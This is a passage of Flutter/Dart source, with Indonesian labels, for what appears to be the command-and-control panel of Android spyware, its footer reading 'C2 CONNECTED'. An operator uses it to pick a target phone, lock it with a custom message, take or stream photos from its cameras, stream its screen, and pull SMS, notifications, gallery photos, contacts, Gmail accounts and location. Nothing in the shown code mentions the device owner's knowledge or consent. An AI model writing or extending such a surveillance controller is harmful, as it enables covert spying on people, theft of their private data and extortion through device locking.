    final String number = (index + 1).toString().padLeft(2, '0');

    return GestureDetector(
      onTap: () {
        setState(() {
          _targetId = device['id']?.toString() ?? '';
          _targetModel = displayName;
          _deviceData = Map<String, dynamic>.from(device);
          _currentTab = TabIndex.control;
        });
        _addLog("🎯 Selected: $_targetModel", LogType.success);
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              _cardColor,
              _cardColor.withOpacity(0.8),
            ],
          ),
          borderRadius: BorderRadius.circular(24),
          border: Border.all(
            color: isActive ? Colors.green.withOpacity(0.3) : Colors.red.withOpacity(0.2),
            width: 1.5,
          ),
          boxShadow: [
            BoxShadow(
              color: isActive ? Colors.green.withOpacity(0.1) : Colors.transparent,
              blurRadius: 20,
              spreadRadius: 5,
            ),
          ],
        ),
        child: Row(
          children: [
            // Icon dengan gradient background
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [Colors.blue.shade800, Colors.purple.shade800],
                ),
                borderRadius: BorderRadius.circular(16),
                boxShadow: [
                  BoxShadow(
                    color: Colors.blue.withOpacity(0.2),
                    blurRadius: 10,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: Icon(Icons.phone_android, color: Colors.white, size: 28),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    displayName,
                    style: const TextStyle(
                      color: Colors.white,
                      fontWeight: FontWeight.bold,
                      fontSize: 16,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    "Android $androidVersion • SDK $sdkVersion",
                    style: TextStyle(color: Colors.white54, fontSize: 12),
                  ),
                  const SizedBox(height: 6),
                  Row(
                    children: [
                      Icon(Icons.battery_charging_full, size: 14, color: battery > 20 ? Colors.green : Colors.red),
                      const SizedBox(width: 4),
                      Text(
                        "$battery%",
                        style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold),
                      ),
                      const SizedBox(width: 16),
                      Container(
                        width: 8,
                        height: 8,
                        decoration: BoxDecoration(
                          color: statusColor,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 4),
                      Text(
                        isActive ? "ONLINE" : "OFFLINE",
                        style: TextStyle(color: statusColor, fontSize: 10, fontWeight: FontWeight.bold),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            // Nomor urut
            Container(
              width: 32,
              height: 32,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: LinearGradient(
                  colors: [Colors.blue.withOpacity(0.2), Colors.purple.withOpacity(0.2)],
                ),
              ),
              child: Center(
                child: Text(
                  number,
                  style: TextStyle(
                    color: _glowColor2,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── TAB: CONTROL ──────────────────────────────────────────────────────
  Widget _buildControlTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU CUY!",
          style: TextStyle(color: Colors.white54, fontSize: 18, fontWeight: FontWeight.bold),
        ),
      );
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildDeviceInfoCard(),
          const SizedBox(height: 20),
          const Text(
            "REMOTE KONTROL",
            style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold, letterSpacing: 2),
          ),
          const SizedBox(height: 8),
          Text(
            "KONTROL",
            style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1),
          ),
          const SizedBox(height: 16),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              crossAxisSpacing: 12,
              mainAxisSpacing: 12,
              childAspectRatio: 1.1,
            ),
            itemCount: _controlItems.length,
            itemBuilder: (context, index) {
              final item = _controlItems[index];
              if (item['isToggle'] == true) {
                return _buildToggleCard(
                  label: item['label'],
                  icon: item['icon'],
                  color: item['color'],
                  isOn: item['isOn'],
                  needsInput: item['needsInput'] ?? false,
                  inputHint: item['inputHint'] ?? '',
                  inputType: item['inputType'] ?? 'text',
                  command: item['command'],
                );
              } else {
                return _buildActionCard(
                  label: item['label'],
                  icon: item['icon'],
                  color: item['color'],
                  onTap: () => _handleActionTap(item),
                );
              }
            },
          ),
          const SizedBox(height: 20),
          _buildTerminalLogs(),
          const SizedBox(height: 20),
          _buildControlFooter(),
        ],
      ),
    );
  }

  // ─── TOGGLE CARD DENGAN GLASSMORPHISM ──────────────────────────────
  Widget _buildToggleCard({
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
  }) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _cardColor,
            _cardColor.withOpacity(0.6),
          ],
        ),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(
          color: isOn ? color.withOpacity(0.4) : Colors.white.withOpacity(0.05),
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: isOn ? color.withOpacity(0.1) : Colors.transparent,
            blurRadius: 15,
            spreadRadius: 3,
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              // Icon dengan background gradien
              Container(
                width: 44,
                height: 44,
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [color.withOpacity(0.3), color.withOpacity(0.1)],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: color.withOpacity(0.2)),
                ),
                child: Icon(icon, color: color, size: 24),
              ),
              // Switch dengan warna gradien
              Switch(
                value: isOn,
                onChanged: (bool value) async {
                  if (needsInput && value == true) {
                    String? input;
                    if (command == 'lockDevice') {
                      input = await _showLockDeviceDialog();
                    } else {
                      input = await _showInputDialog(
                        title: "Input untuk $label",
                        hint: inputHint,
                        multiline: inputType == 'multiline',
                        keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
                      );
                    }
                    if (input == null) return;
                    _sendCommand(command, extra: input);
                    setState(() {
                      _updateControlItemState(command, true);
                    });
                  } else if (needsInput && value == false) {
                    if (command == 'lockDevice' || command == 'lockCustom') {
                      _sendCommand('unlockDevice', extra: '');
                    } else if (command == 'videoOverlay') {
                      _sendCommand('videoOverlayHide', extra: '');
                    } else {
                      _sendCommand(command, extra: 'false');
                    }
                    setState(() {
                      _updateControlItemState(command, false);
                    });
                  } else {
                    _sendCommand(command, extra: value.toString());
                    setState(() {
                      _updateControlItemState(command, value);
                    });
                  }
                },
                activeColor: Colors.blueAccent,
                activeTrackColor: Colors.blueAccent.withOpacity(0.2),
                inactiveThumbColor: Colors.grey,
                inactiveTrackColor: Colors.transparent,
              ),
            ],
          ),
          const Spacer(),
          Text(
            label,
            style: const TextStyle(color: Colors.white, fontSize: 16, fontWeight: FontWeight.bold),
          ),
          const SizedBox(height: 4),
          Text(
            isOn ? "On" : "Off",
            style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 12),
          ),
        ],
      ),
    );
  }

  // ─── ACTION CARD DENGAN GLASSMORPHISM ──────────────────────────────
  Widget _buildActionCard({
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topLeft,
            end: Alignment.bottomRight,
            colors: [
              color.withOpacity(0.07),
              _cardColor,
              _cardColor.withOpacity(0.8),
            ],
          ),
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: color.withOpacity(0.35), width: 1.2),
          boxShadow: [
            BoxShadow(color: color.withOpacity(0.12), blurRadius: 20, spreadRadius: 1, offset: const Offset(0, 4)),
            BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 8),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ICON DENGAN GLOW
            Container(
              width: 46, height: 46,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [color.withOpacity(0.25), color.withOpacity(0.08)],
                  begin: Alignment.topLeft, end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: color.withOpacity(0.3)),
                boxShadow: [BoxShadow(color: color.withOpacity(0.2), blurRadius: 10)],
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const Spacer(),
            Text(label, style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold, letterSpacing: 0.3)),
            const SizedBox(height: 4),
            Row(children: [
              Container(width: 16, height: 2, decoration: BoxDecoration(gradient: LinearGradient(colors: [color, Colors.transparent]), borderRadius: BorderRadius.circular(2))),
              const SizedBox(width: 6),
              Text("EXECUTE", style: TextStyle(color: color.withOpacity(0.6), fontSize: 9, fontFamily: 'Orbitron', letterSpacing: 1)),
            ]),
          ],
        ),
      ),
    );
  }

  // ─── HANDLE AKSI TAP ─────────────────────────────────────────────────
  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    // ── COMMAND UNLOCK ──
    if (command == "unlockDevice") {
      _sendCommand('unlockDevice', extra: '');
      _addLog("🔓 Unlock device command sent", LogType.success);
      return;
    }

    // ── HANDLE COMMAND KHUSUS ──
    if (command == "camera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _takeScreenshotViaRest(facing);
      return;
    }
    if (command == "liveCamera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _startLiveCameraPolling(facing);
      return;
    }
    if (command == "stopCamera") {
      _sendCommand('camera', extra: 'stop');
      _addLog("📷 Stop camera command sent", LogType.info);
      if (_cameraModalVisible) _closeCameraModal();
      return;
    }
    if (command == "stopScreen") {
      _sendCommand('screen', extra: 'stop');
      _addLog("🖥️ Stop screen command sent", LogType.info);
      if (_screenModalVisible) _closeScreenModal();
      return;
    }

    // ── COMMAND BIASA ──
    if (needsInput) {
      String? input;
      if (command == 'lockDevice') {
        input = await _showLockDeviceDialog();
      } else {
        input = await _showInputDialog(
          title: "Input untuk ${item['label']}",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
          initialValue: extra,
        );
      }
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  // ─── DEVICE INFO CARD DENGAN GLASSMORPHISM ──────────────────────────
  Widget _buildDeviceInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            _cardColor,
            _cardColor.withOpacity(0.8),
          ],
        ),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: _glowColor1.withOpacity(0.15)),
        boxShadow: [
          BoxShadow(
            color: Colors.blue.withOpacity(0.05),
            blurRadius: 20,
            spreadRadius: 5,
          ),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [Colors.blue.shade800, Colors.purple.shade800],
              ),
              borderRadius: BorderRadius.circular(18),
              boxShadow: [
                BoxShadow(
                  color: Colors.blue.withOpacity(0.2),
                  blurRadius: 10,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: const Icon(Icons.phone_android, color: Colors.white, size: 30),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: const BoxDecoration(
                        color: Colors.green,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      "ONLINE",
                      style: TextStyle(
                        color: Colors.green,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  _targetModel,
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  "Android 14 R   Bat ${_deviceData['battery'] ?? 0}%   Tema default",
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.5),
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── TAB: MESSAGES ────────────────────────────────────────────────────
  Widget _buildMessagesTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU!",
          style: TextStyle(color: Colors.white54, fontWeight: FontWeight.bold),
        ),
      );
    }

    return Column(
      children: [
        _buildMessageHeader(),
        Expanded(
          child: _smsData.isEmpty && _notifData.isEmpty
              ? Center(
            child: Text(
              "Belum ada pesan. Tap refresh!",
              style: TextStyle(color: Colors.white54),
            ),
          )
              : ListView(
            padding: const EdgeInsets.all(16),
            children: [
              if (_smsData.isNotEmpty) ...[
                Text("SMS", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, fontSize: 14)),
                const SizedBox(height: 8),
                ...(_smsData['status']?['smsList'] as List? ?? []).map((app) => _buildMessageItem(app, 'SMS')),
              ],
              if (_notifData.isNotEmpty) ...[
                const SizedBox(height: 20),
                Text("NOTIFIKASI", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, fontSize: 14)),
                const SizedBox(height: 8),
                ...(_notifData['status']?['notifList'] as List? ?? []).map((app) => _buildMessageItem(app, 'NOTIF')),
              ],
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildMessageHeader() {
    return Container(
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          Text("PESAN & NOTIFIKASI", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, letterSpacing: 2)),
          const Spacer(),
          ElevatedButton.icon(
            onPressed: () {
              _sendCommand('getSms');
              _sendCommand('getNotifs');
              _addLog("🔄 Refresh SMS & Notif", LogType.info);
            },
            icon: const Icon(Icons.refresh, size: 16),
            label: const Text("REFRESH"),
            style: ElevatedButton.styleFrom(
              backgroundColor: _glowColor1.withOpacity(0.2),
              foregroundColor: _glowColor1,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessageItem(dynamic app, String type) {
    final messages = app['messages'] as List? ?? [];
    final appName = app['appName'] ?? 'Unknown';
    final count = messages.length;
    final preview = messages.isNotEmpty ? (messages.first['text'] ?? '').toString() : '';

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white10),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [Colors.blue.shade800, Colors.purple.shade800],
              ),
              borderRadius: BorderRadius.circular(12),
            ),
            child: Center(child: Text(appName[0].toUpperCase(), style: const TextStyle(color: Colors.white))),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                Text(preview, style: TextStyle(color: Colors.white54, fontSize: 12), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ),
          ),
          Text("$count", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  // ─── TERMINAL LOGS ──────────────────────────────────────────────────
  Widget _buildTerminalLogs() {
    return Container(
      height: 120,
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _isConnected ? _successColor.withOpacity(0.3) : _roseColor.withOpacity(0.3)),
      ),
      child: ListView.builder(
        controller: _logScrollController,
        reverse: true,
        padding: const EdgeInsets.all(10),
        itemCount: _executionLogs.length,
        itemBuilder: (context, i) {
          final log = _executionLogs[_executionLogs.length - 1 - i];
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 2),
            child: Row(
              children: [
                Text("[${_formatTime(log.timestamp)}]", style: TextStyle(color: Colors.grey[600], fontSize: 10)),
                const SizedBox(width: 8),
                Expanded(child: Text(log.message, style: TextStyle(color: _getLogColor(log.type), fontSize: 11))),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildControlFooter() {
    return Text(
      "SYSTEM SECURED • C2 CONNECTED",
      style: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 10, letterSpacing: 2),
      textAlign: TextAlign.center,
    );
  }

  // ─── TAKE SCREENSHOT VIA REST ──────────────────────────────────────
  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';
    
    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Taking screenshot via REST ($facing)", LogType.info);

    // Tampilkan loading
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.9),
            borderRadius: BorderRadius.circular(20),
          ),
          child: const Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              SizedBox(
                width: 40,
                height: 40,
                child: CircularProgressIndicator(
                  color: Colors.white54,
                  strokeWidth: 3,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                "MENGAMBIL FOTO...",
                style: TextStyle(
                  color: Colors.white54,
                  fontSize: 12,
                  letterSpacing: 2,
                ),
              ),
            ],
          ),
        ),
      ),
    );

    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );
      
      if (mounted) Navigator.pop(context);
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          _addLog("📸 Screenshot via REST berhasil", LogType.success);
          
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () {
                  Navigator.pop(context);
                },
              ),
              fullscreenDialog: true,
            ),
          );
        } else {
          _addLog("❌ Screenshot REST: frame kosong", LogType.error);
        }
      } else {
        _addLog("❌ Screenshot REST gagal: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
      _addLog("⚠️ Screenshot REST error: $e", LogType.error);
    }
  }

  // ─── CAMERA SOCKET METHODS ──────────────────────────────────────────

  /// Mengambil foto tunggal via socket
  void _takeCameraSocket(String facing) {
    if (_isWaitingForPhoto) {
      _addLog("⚠️ Masih menunggu foto sebelumnya", LogType.warning);
      return;
    }
    setState(() {
      _isWaitingForPhoto = true;
      _cameraFacing = facing;
    });
    _sendCommand('camera', extra: facing);
    _addLog("📸 Mengambil foto ($facing) via socket", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        _photoLoadingContext = context;
        return const Center(
          child: Card(
            color: Colors.black87,
            child: Padding(
              padding: EdgeInsets.all(24.0),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: Colors.white54)),
                  SizedBox(height: 16),
                  Text("MENGAMBIL FOTO...", style: TextStyle(color: Colors.white54, fontSize: 12, letterSpacing: 2)),
                ],
              ),
            ),
          ),
        );
      },
    );

    Future.delayed(Duration(seconds: 10), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
          _photoLoadingContext = null;
        }
        _addLog("⚠️ Timeout mengambil foto", LogType.warning);
      }
    });
  }

  /// Live camera via socket
  void _startLiveCameraSocket(String facing) {
    if (_screenModalVisible) _closeScreenModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _sendCommand('liveCamera', extra: facing);
    _addLog("📷 Starting live camera ($facing) via socket", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          frameStream: _cameraFrameStreamController.stream,
          isLoading: _cameraLoading,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            _sendCommand('liveCamera', extra: newFacing);
            setState(() => _cameraFacing = newFacing);
          },
          onCapture: () {
            _takeCameraSocket(_cameraFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── LIVE CAMERA VIA REST (POLLING) ──────────────────────────────
  Future<void> _startLiveCameraPolling(String facing) async {
    if (_screenModalVisible) {
      _closeScreenModal();
    }
    if (_screenshotResultVisible) {
      _closeScreenshotResult();
    }

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Starting live camera polling ($facing)", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            setState(() => _cameraFacing = newFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── SCREEN MODAL ──────────────────────────────────────────────────
  void _openScreenModal() {
    setState(() {
      _screenFrame = '';
      _screenLoading = true;
      _screenModalVisible = true;
    });
    _sendCommand('screen', extra: 'start');
    _addLog("🖥️ Opening screen stream", LogType.info);
  }

  void _closeScreenModal() {
    setState(() {
      _screenModalVisible = false;
      _screenFrame = '';
      _screenLoading = true;
    });
    _sendCommand('screen', extra: 'stop');
    _addLog("🖥️ Screen stream closed", LogType.info);
  }

  void _closeCameraModal() {
    setState(() {
      _cameraModalVisible = false;
      _cameraFrame = '';
      _cameraLoading = true;
    });
    _sendCommand('camera', extra: 'stop');
    _addLog("📷 Camera stream closed", LogType.info);
  }

  Widget _buildScreenModal() {
    if (!_screenModalVisible) return const SizedBox.shrink();
    return Stack(
      children: [
        Container(
          color: Colors.black,
          width: double.infinity,
          height: double.infinity,
        ),
        if (_screenFrame.isNotEmpty)
          Center(
            child: InteractiveViewer(
              minScale: 0.5,
              maxScale: 3.0,
              child: Image.memory(
                base64Decode(_screenFrame.split(',').last),
                fit: BoxFit.contain,
                width: double.infinity,
                height: double.infinity,
                errorBuilder: (context, error, stackTrace) {
                  return const Center(
                    child: Text(
                      "Loading screen...",
                      style: TextStyle(color: Colors.white54),
                    ),
                  );
                },
              ),
            ),
          )
        else
          const Center(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(
                  width: 50,
                  height: 50,
                  child: CircularProgressIndicator(
                    color: Colors.white54,
                    strokeWidth: 3,
                  ),
                ),
                SizedBox(height: 20),
                Text(
                  "CONNECTING SCREEN...",
                  style: TextStyle(
                    color: Colors.white54,
                    fontSize: 13,
                    letterSpacing: 3,
                  ),
                ),
              ],
            ),
          ),
      ],
    );
  }

  // ─── SCREENSHOT RESULT ──────────────────────────────────────────────
  void _closeScreenshotResult() {
    setState(() {
      _screenshotResultVisible = false;
      _screenshotFrame = '';
    });
  }

  void _downloadScreenshotFromResult() {
    if (_screenshotFrame.isEmpty) return;
    _downloadScreenshot(_screenshotFrame);
  }

  Widget _buildScreenshotResult() {
    if (!_screenshotResultVisible || _screenshotFrame.isEmpty) return const SizedBox.shrink();
    return const SizedBox.shrink();
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
      _addLog("✅ Screenshot saved: ${file.path}", LogType.success);
    } catch (e) {
      _addLog("❌ Gagal download: $e", LogType.error);
    }
  }

  // ─── FETCH GALLERY VIA HTTP ──────────────────────────────────────────
  Future<void> _fetchGalleryViaHttp() async {
    try {
        final prefs = await SharedPreferences.getInstance();
        final token = prefs.getString('key') ?? '';
        
        final response = await http.get(
            Uri.parse("$baseUrl/api/gallery/$_targetId"),
            headers: {"x-auth-token": token},
        );
        
        if (response.statusCode == 200) {
            final data = jsonDecode(response.body);
            final photos = data['photos'] as List? ?? [];
            _galleryStreamController.add(photos.map((p) => Map<String, dynamic>.from(p)).toList());
            _addLog("🖼️ Gallery HTTP: ${photos.length} photos", LogType.success);
        } else {
            _addLog("❌ Gallery HTTP failed: ${response.statusCode}", LogType.error);
        }
    } catch (e) {
        _addLog("⚠️ Gallery HTTP error: $e", LogType.error);
    }
  }

  // ─── GALLERY FULLSCREEN ──────────────────────────────────────────────
  void _openGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = true;
      _isGalleryLoading = true;
      _galleryPhotos = [];
    });

    _sendCommand('getGallery');
    _addLog("🖼️ Opening gallery fullscreen", LogType.info);
    _fetchGalleryViaHttp();
  }

  void _closeGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = false;
      _galleryPhotos = [];
      _currentGalleryImage = '';
      _currentGalleryIndex = 0;
    });
  }

  // ─── SHOW DIALOG DATA ──────────────────────────────────────────────
  void _showContactsDialog() {
    _sendCommand('getContacts');
    _addLog("📇 Mengambil kontak...", LogType.info);
  }

  void _showContactsData(Map<String, dynamic> data) {
    final contacts = data['contacts'] as List? ?? [];
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.9),
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.all(16),
        child: Container(
          width: double.infinity,
          height: 500,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.95),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: _glowColor1.withOpacity(0.3)),
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(16),
                child: Row(
                  children: [
                    const Icon(Icons.contacts, color: Colors.amber),
                    const SizedBox(width: 12),
                    Text(
                      "📇 Kontak (${contacts.length})",
                      style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16),
                    ),
                    const Spacer(),
                    IconButton(
                      icon: const Icon(Icons.close, color: Colors.white),
                      onPressed: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: contacts.isEmpty
                    ? const Center(child: Text("Tidak ada kontak", style: TextStyle(color: Colors.white54)))
                    : ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 16),
                  itemCount: contacts.length > 100 ? 100 : contacts.length,
                  itemBuilder: (context, i) {
                    final c = contacts[i];
                    return Container(
                      margin: const EdgeInsets.only(bottom: 6),
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.white.withOpacity(0.05),
                        borderRadius: BorderRadius.circular(10),
                        border: Border.all(color: Colors.white.withOpacity(0.1)),
                      ),
                      child: Row(
                        children: [
                          CircleAvatar(
                            backgroundColor: Colors.amber.withOpacity(0.2),
                            radius: 18,
                            child: Text(
                              (c['name'] ?? '?')[0].toUpperCase(),
                              style: const TextStyle(color: Colors.amber, fontWeight: FontWeight.bold),
                            ),
                          ),
                          const SizedBox(width: 12),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(
                                  c['name'] ?? '-',
                                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                                ),
                                Text(
                                  c['number'] ?? '-',
                                  style: TextStyle(color: Colors.white54, fontSize: 12),
                                ),
                              ],
                            ),
                          ),
                          IconButton(
                            icon: const Icon(Icons.copy, color: Colors.white54, size: 18),
                            onPressed: () {
                              _copyText(c['number'] ?? '');
                            },
                          ),
                        ],
                      ),
                    );
                  },
                ),
              ),
              Padding(
                padding: const EdgeInsets.all(12),
                child: Text(
                  "Menampilkan ${contacts.length > 100 ? '100' : contacts.length} dari ${contacts.length} kontak",
                  style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 10),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  void _showGmailDialog() {
    _sendCommand('getGmail');
    _addLog("📧 Mengambil akun Gmail...", LogType.info);
  }

  void _showGmailData(Map<String, dynamic> data) {}

  void _showLocationDialog() {
    _sendCommand('getLocation');
    _addLog("📍 Mengambil lokasi...", LogType.info);
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.92),
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: EdgeInsets.zero,
        child: Container(
          width: double.infinity,
          height: double.infinity,
          color: Colors.black.withOpacity(0.97),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const SizedBox(
                width: 44,
                height: 44,
                child: CircularProgressIndicator(
                  color: Color(0xFF00E5A0),
